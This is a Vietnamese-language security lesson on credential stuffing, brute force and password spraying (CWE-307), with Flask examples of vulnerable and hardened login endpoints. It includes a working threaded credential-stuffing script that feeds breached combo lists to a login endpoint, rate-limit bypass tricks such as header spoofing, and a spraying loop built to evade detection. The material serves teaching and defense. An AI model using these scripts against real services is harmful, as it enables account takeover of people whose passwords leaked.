# Credential Stuffing & Brute Force

> **CWE**: CWE-307 | **Phân loại**: Authentication

## Kiến thức Nền tảng
Hãy tưởng tượng một tên trộm đang cố gắng đột nhập vào một ngôi nhà. 
- Nếu hắn đứng trước cửa, cầm một bộ dụng cụ vạn năng và kiên nhẫn thử hàng nghìn chiếc chìa khóa khác nhau để mở ổ khóa, đó là tấn công dò mật khẩu thủ công (**Brute Force**).
- Nhưng nếu tên trộm đó lùng sục trên "chợ đen", mua lại một chiếc hộp chứa hàng triệu chiếc chìa khóa thật của những ngôi nhà khác đã từng bị mất trộm, rồi mang chiếc hộp đó đi thử khắp các ngôi nhà trong khu phố với hy vọng chủ nhà lười biếng dùng chung một ổ khóa, đó chính là tấn công chèn thông tin rò rỉ (**Credential Stuffing**).

Sở dĩ cuộc tấn công này thành công là vì thói quen của con người: khoảng 65% chúng ta sử dụng cùng một tổ hợp tài khoản/mật khẩu cho nhiều trang web khác nhau (như Facebook, Gmail, tài khoản mua sắm). Khi một trang web nhỏ, bảo mật kém bị tin tặc hack và làm lộ cơ sở dữ liệu mật khẩu, tin tặc sẽ lập tức dùng danh sách đó để đi "gõ cửa" các dịch vụ lớn hơn như ngân hàng, ví điện tử hay mạng xã hội.

```python
# Normal login endpoint (simplified)
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    user = User.query.filter_by(username=username).first()
    
    if user and check_password_hash(user.password_hash, password):
        session['user_id'] = user.id
        return redirect('/dashboard')
    
    # Generic error message (good practice)
    return render_template('login.html', error='Invalid credentials')
```

Endpoint trên hoạt động đúng cho từng request, nhưng nếu không có cơ chế giới hạn tốc độ (rate limiting), attacker có thể gửi hàng nghìn request mỗi phút để thử tổ hợp credentials.

## Mô tả lỗ hổng
Lỗ hổng này xảy ra khi hệ thống xác thực của trang web quá hiền lành, cho phép bất kỳ ai gửi hàng ngàn yêu cầu đăng nhập liên tục mà không có biện pháp ngăn chặn hay giới hạn tốc độ. 

Mối nguy hiểm của lỗ hổng này rất rõ ràng: kẻ tấn công sử dụng các công cụ tự động hóa (scripts) để chạy thử hàng triệu tài khoản bị rò rỉ hoặc thử đoán mật khẩu trong thời gian cực ngắn. Nếu không bị chặn, chúng chắc chắn sẽ tìm ra được những tài khoản sử dụng mật khẩu yếu hoặc tái sử dụng mật khẩu cũ, từ đó chiếm đoạt thông tin cá nhân và tài sản của khách hàng mà không gặp bất kỳ rào cản nào.

## Cơ chế tấn công
**1. Credential Stuffing với danh sách breach:**

```python
import requests
from concurrent.futures import ThreadPoolExecutor

# Load leaked credentials from data breach
def load_credentials(filepath):
    creds = []
    with open(filepath) as f:
        for line in f:
            email, password = line.strip().split(':')
            creds.append((email, password))
    return creds

def try_login(cred):
    email, password = cred
    resp = requests.post('https://target.com/login', data={
        'username': email, 'password': password
    }, allow_redirects=False)
    
    # Check for successful login indicators
    if resp.status_code == 302 and '/dashboard' in resp.headers.get('Location', ''):
        print(f"[+] VALID: {email}:{password}")
        return (email, password)
    return None

# Test thousands of stolen credentials concurrently
creds = load_credentials('breach_combo_list.txt')
with ThreadPoolExecutor(max_workers=20) as executor:
    results = list(executor.map(try_login, creds))
```

**2. Rate Limiting Bypass Techniques:**

```http
// Technique 1: IP rotation via headers
X-Forwarded-For: 1.2.3.4
X-Real-IP: 5.6.7.8
X-Originating-IP: 9.10.11.12

// Technique 2: Case variation to bypass username-based lockout
POST /login  → username=Admin@target.com
POST /login  → username=admin@target.com
POST /login  → username=ADMIN@target.com

// Technique 3: Add null bytes or whitespace
POST /login  → username=admin%00@target.com
POST /login  → username= admin@target.com
```

**3. Password Spraying — thử 1 mật khẩu cho nhiều user:**

```python
# Spray common passwords across many accounts
# Avoids per-account lockout thresholds
common_passwords = ['Password1!', 'Company2025!', 'Welcome1']
usernames = ['john.doe', 'jane.smith', 'admin', 'user1']

for password in common_passwords:
    for username in usernames:
        try_login((username, password))
        time.sleep(2)  # Slow down to avoid detection
```

## Biện pháp phòng thủ
- **Tóm tắt**: Chống Credential Stuffing bằng cách triển khai rate limiting, cơ chế khóa tài khoản tạm thời (progressive lockout), CAPTCHA và phát hiện mật khẩu bị rò rỉ.
- **Các bước chi tiết**:
  - **Rate limiting**: Giới hạn 5-10 lần thử mỗi IP mỗi phút, sử dụng token bucket hoặc sliding window algorithm.
  - **Account lockout**: Khóa tạm thời tài khoản sau N lần thất bại (progressive delay: 1 phút → 5 phút → 30 phút).
  - **CAPTCHA**: Yêu cầu CAPTCHA sau 3 lần thất bại liên tiếp.
  - **Breach password detection**: Kiểm tra mật khẩu mới đối chiếu với database breach đã biết (HaveIBeenPwned API).
  - **MFA enforcement**: Bật 2FA giúp credential stuffing trở nên vô hiệu ngay cả khi mật khẩu đúng.

## Code Example
```python
# VULNERABLE: no rate limiting, no lockout
@app.route('/login', methods=['POST'])
def login_unsafe():
    user = User.query.filter_by(username=request.form['username']).first()
    if user and check_password(user, request.form['password']):
        return login_user(user)
    # Attacker can try unlimited times
    return "Invalid credentials", 401
```

```python
# SECURE: rate limiting + progressive lockout + breach detection
from flask_limiter import Limiter
import hashlib, requests as req

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit("10 per minute")  # IP-based rate limit
def login_safe():
    username = request.form['username']
    password = request.form['password']
    
    # Check if account is temporarily locked
    lockout = get_lockout_status(username)
    if lockout and lockout.locked_until > datetime.utcnow():
        remaining = (lockout.locked_until - datetime.utcnow()).seconds
        return jsonify({"error": f"Account locked. Retry in {remaining}s"}), 429
    
    user = User.query.filter_by(username=username.lower().strip()).first()
    if user and check_password(user, password):
        clear_failed_attempts(username)
        return login_user(user)
    
    # Progressive lockout: 3→1min, 6→5min, 10→30min
    failures = increment_failed_attempts(username)
    if failures >= 10:
        lock_account(username, minutes=30)
    elif failures >= 6:
        lock_account(username, minutes=5)
    elif failures >= 3:
        lock_account(username, minutes=1)
    
    return jsonify({"error": "Invalid credentials"}), 401
```

## Xem thêm
- [Các bài học liên quan trong cùng thư mục](../)

## Nguồn tham khảo
- PortSwigger: https://portswigger.net/web-security/authentication/password-based
- OWASP: https://owasp.org/www-community/attacks/Credential_stuffing
- CWE: https://cwe.mitre.org/data/definitions/307.html

## Giải thích thuật ngữ
- **Brute Force (Tấn công vét cạn)**: Phương pháp thử tất cả các chuỗi mật khẩu có thể có cho đến khi tìm được mật khẩu đúng, thường được thực hiện tự động bằng phần mềm.
- **Credential Stuffing (Nhồi thông tin đăng nhập)**: Kiểu tấn công tự động sử dụng danh sách các cặp tài khoản và mật khẩu bị rò rỉ từ một trang web khác để thử đăng nhập vào trang web mục tiêu.
- **Password Spraying (Rải mật khẩu)**: Kỹ thuật thử nghiệm một số ít mật khẩu rất phổ biến (như `123456`, `Password123`) trên một danh sách dài các tài khoản người dùng khác nhau để tránh bị khóa tài khoản.
- **Rate Limiting (Giới hạn lưu lượng)**: Cơ chế kiểm soát và giới hạn số lượng yêu cầu (requests) mà một địa chỉ IP hoặc tài khoản được phép gửi tới máy chủ trong một khoảng thời gian nhất định.
- **Account Lockout (Khóa tài khoản)**: Cơ chế bảo mật tự động khóa tạm thời hoặc vĩnh viễn tài khoản người dùng sau khi phát hiện một số lần cố gắng đăng nhập sai liên tiếp.
- **Data Breach (Rò rỉ dữ liệu)**: Sự cố an ninh mạng mà trong đó thông tin nhạy cảm, bí mật hoặc được bảo vệ bị truy cập, xem hoặc sao chép bởi một cá nhân hoặc tổ chức không có thẩm quyền.
